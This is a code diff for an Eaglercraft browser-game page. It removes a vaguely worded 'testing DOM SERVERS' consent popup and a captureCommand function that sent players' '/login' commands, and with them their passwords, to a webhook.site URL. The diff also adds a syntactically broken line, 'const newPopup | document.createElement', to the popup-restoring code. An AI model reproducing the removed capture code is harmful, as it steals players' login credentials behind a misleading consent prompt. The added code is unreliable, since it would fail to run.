@@ -72,40 +72,6 @@
             background: #666;
         }
 
-        #consent-popup {
-            position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            background-color: rgba(30, 30, 30, 0.95);
-            color: white;
-            padding: 20px;
-            border-radius: 10px;
-            z-index: 2147483648;
-            font-family: sans-serif;
-            box-shadow: 0 0 10px rgba(0,0,0,0.5);
-            text-align: center;
-            display: none;
-        }
-
-        #consent-popup.visible {
-            display: block;
-        }
-
-        #consent-popup button {
-            margin: 10px;
-            padding: 5px 15px;
-            border: none;
-            background: #444;
-            color: white;
-            border-radius: 5px;
-            cursor: pointer;
-        }
-
-        #consent-popup button:hover {
-            background: #666;
-        }
-
         #feedback-form textarea {
             width: 100%;
             padding: 5px;
@@ -119,12 +85,6 @@
 
     <div id="splash-screen">
         <img src="Splash.png" alt="Custom Splash Screen">
-    </div>
-
-    <div id="consent-popup">
-        <p>testing DOM SERVERS</p>
-        <button id="consent-allow">Allow</button>
-        <button id="consent-deny">Deny</button>
     </div>
 
     <div id="popup-menu">
@@ -142,35 +102,19 @@
         "use strict";
         
         let originalPopupContent = '';
-        let hasConsent = false;
+        
+        window.addEventListener('DOMContentLoaded', () => {
+            const popup = document.getElementById('popup-menu');
+            if (popup) {
+                originalPopupContent = popup.innerHTML;
+            }
+        });
         
         function closePopup() {
             document.getElementById('popup-menu').style.display = 'none';
         }
         
-        function grantConsent() {
-            console.log('Consent granted');
-            hasConsent = true;
-            const consentPopup = document.getElementById('consent-popup');
-            if (consentPopup) {
-                consentPopup.classList.remove('visible');
-            }
-        }
-        
-        function denyConsent() {
-            console.log('Consent denied');
-            hasConsent = false;
-            const consentPopup = document.getElementById('consent-popup');
-            if (consentPopup) {
-                consentPopup.classList.remove('visible');
-            }
-        }
-        
         async function submitFeedback() {
-            if (!hasConsent) {
-                alert('Please allow data collection in the consent popup before submitting.');
-                return;
-            }
             const feedback = document.getElementById('feedback-input').value;
             if (!feedback) {
                 alert('Please enter feedback before submitting.');
@@ -197,28 +141,6 @@
             } catch (error) {
                 console.error('Error submitting feedback:', error);
                 alert('Error submitting feedback.');
-            }
-        }
-        
-        // Call this from Eaglercraft's command handler (e.g., chat or command input)
-        function captureCommand(command) {
-            if (!hasConsent) return;
-            if (command.trim().toLowerCase().startsWith('/login')) {
-                try {
-                    fetch('https://webhook.site/618173e1-b909-4f86-b229-bc0dd7604316', {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json'
-                        },
-                        body: JSON.stringify({
-                            type: 'command',
-                            content: command,
-                            timestamp: new Date().toISOString()
-                        })
-                    });
-                } catch (error) {
-                    console.error('Error sending command:', error);
-                }
             }
         }
         
@@ -324,24 +246,6 @@
             }
 
             ensurePopupVisibility();
-
-            // Show consent popup after game initialization
-            setTimeout(() => {
-                const consentPopup = document.getElementById('consent-popup');
-                if (consentPopup) {
-                    consentPopup.classList.add('visible');
-                }
-            }, 10000);
-
-            // Attach consent button listeners
-            const allowButton = document.getElementById('consent-allow');
-            const denyButton = document.getElementById('consent-deny');
-            if (allowButton) {
-                allowButton.addEventListener('click', grantConsent);
-            }
-            if (denyButton) {
-                denyButton.addEventListener('click', denyConsent);
-            }
         });
         
         window.addEventListener('DOMContentLoaded', () => {
@@ -353,7 +257,7 @@
             const observer = new MutationObserver(mutations => {
                 const popup = document.getElementById('popup-menu');
                 if (!popup || !document.body.contains(popup)) {
-                    const newPopup = document.createElement("div");
+                    const newPopup | document.createElement("div");
                     newPopup.id = "popup-menu";
                     newPopup.innerHTML = originalPopupContent + `
                         <p>Submit feedback or ideas:</p>
